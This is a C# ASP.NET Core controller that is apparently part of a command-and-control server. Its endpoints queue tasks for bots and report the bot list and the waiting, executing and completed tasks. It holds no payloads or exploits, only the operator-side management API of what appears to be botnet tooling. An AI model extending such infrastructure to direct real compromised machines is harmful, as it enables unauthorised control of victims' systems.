using C2.Models;
using C2.POCOs;
using Microsoft.AspNetCore.Mvc;
using System.Collections.Concurrent;

namespace C2.Controllers;

[ApiController]
[Route("[controller]")]
public class ManagementController : AbstractController
{
    [HttpGet("ManagementTest")]
    [ProducesResponseType(StatusCodes.Status200OK)]
    public IActionResult ManagementTest() => Ok();

    [HttpPost("QueueTask")]
    [ProducesResponseType(StatusCodes.Status200OK)]
    public IActionResult QueueTask([FromBody] AddedBotTask task)
    {
        C2State.TaskManager.QueueBotTask(task.Task, task.TaskParameters);
        return Ok();
    }

    [HttpGet("GetBotManager")]
    [ProducesResponseType(typeof(BotManager), StatusCodes.Status200OK)]
    public IActionResult GetBotManager() => Ok(C2State.BotManager.Bots);

    [HttpGet("GetWaitingTasks")]
    [ProducesResponseType(typeof(ConcurrentQueue<BotTask>), StatusCodes.Status200OK)]
    public IActionResult GetWaitingTasks() => Ok(C2State.TaskManager.Waiting);

    [HttpGet("GetExecutingTasks")]
    [ProducesResponseType(typeof(ConcurrentDictionary<int, BotTask>), StatusCodes.Status200OK)]
    public IActionResult GetExecutingTasks() => Ok(C2State.TaskManager.Executing);

    [HttpGet("GetCompletedTasks")]
    [ProducesResponseType(typeof(ConcurrentBag<BotTask>), StatusCodes.Status200OK)]
    public IActionResult GetCompletedTasks() => Ok(C2State.TaskManager.Completed);

}
